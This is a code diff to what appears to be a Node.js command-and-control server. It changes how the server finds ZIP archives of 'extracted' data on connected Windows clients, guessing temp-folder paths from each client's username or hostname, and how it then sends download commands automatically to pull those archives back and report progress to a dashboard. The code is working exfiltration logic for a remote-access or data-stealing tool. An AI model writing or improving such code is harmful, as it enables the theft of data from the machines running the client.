@@ -402,10 +402,10 @@ function createTcpServer() {
 
           // Auto-detect extract result and trigger download
           if (message.content.includes('AUTO_EXTRACT_START') && message.content.includes('ZIP FILE LOCATIONS')) {
-            // Extract the first ZIP path (full Windows temp path)
-            const zipMatch = message.content.match(/data_[a-f0-9]+\.zip/);
-            if (zipMatch) {
-              const zipPath = 'C:\\Users\\ADMIN\\AppData\\Local\\Temp\\' + zipMatch[0];  // Prepend full temp dir (adjust if needed)
+            // Extract the full ZIP path from the client output (dynamic path detection)
+            const zipPathMatch = message.content.match(/ZIP FILE LOCATIONS?:\s*([^\n\r]+)/i);
+            if (zipPathMatch) {
+              const zipPath = zipPathMatch[1].trim();
               console.log(`[TCP] Auto-detected ZIP: ${zipPath}. Triggering download...`);
 
               // Send download command
@@ -427,7 +427,38 @@ function createTcpServer() {
               io.emit('commandResponse', { clientId, response: `Auto-download initiated: ${zipPath}`, timestamp: new Date() });
               console.log(`[TCP] Auto-downloading ZIP from ${client.hostname}`);
             } else {
-              console.log('[TCP] No ZIP path found in extract result');
+              // Fallback: try to extract just the filename and construct path
+              const zipMatch = message.content.match(/data_[a-f0-9]+\.zip/);
+              if (zipMatch) {
+                // Try common Windows temp paths
+                const possiblePaths = [
+                  `C:\\Users\\${client.username || 'ADMIN'}\\AppData\\Local\\Temp\\${zipMatch[0]}`,
+                  `C:\\Users\\${client.hostname}\\AppData\\Local\\Temp\\${zipMatch[0]}`,
+                  `C:\\Windows\\Temp\\${zipMatch[0]}`,
+                  `C:\\Temp\\${zipMatch[0]}`
+                ];
+                
+                const zipPath = possiblePaths[0]; // Use first fallback
+                console.log(`[TCP] Fallback ZIP path: ${zipPath}. Triggering download...`);
+
+                const downloadCmd = {
+                  type: 'command',
+                  content: `download ${zipPath}`
+                };
+                socket.write(JSON.stringify(downloadCmd) + '\n');
+
+                client.pendingDownload = {
+                  inProgress: true,
+                  filename: zipPath,
+                  buffer: Buffer.alloc(0),
+                  timeout: null
+                };
+
+                io.emit('commandResponse', { clientId, response: `Auto-download initiated (fallback): ${zipPath}`, timestamp: new Date() });
+                console.log(`[TCP] Auto-downloading ZIP from ${client.hostname} (fallback)`);
+              } else {
+                console.log('[TCP] No ZIP path found in extract result');
+              }
             }
           }
           
